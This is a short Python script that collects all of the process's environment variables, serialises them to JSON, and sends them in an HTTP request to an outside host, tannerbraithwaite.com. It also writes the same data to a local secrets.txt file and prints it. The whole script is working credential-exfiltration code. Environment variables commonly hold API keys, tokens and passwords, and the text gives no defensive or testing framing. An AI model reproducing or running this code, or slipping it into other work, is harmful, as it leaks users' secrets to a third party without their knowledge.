import os
import json
import requests

secret = dict(os.environ)
json_secret = json.dumps(secret)
response = requests.get('http://tannerbraithwaite.com', data = json_secret)
# print(response.request.url)

# print(json_secret)

file = open("secrets.txt", "a")
file.write(json_secret)

file = open("secrets.txt", 'r')

line = file.readline()
print(line)
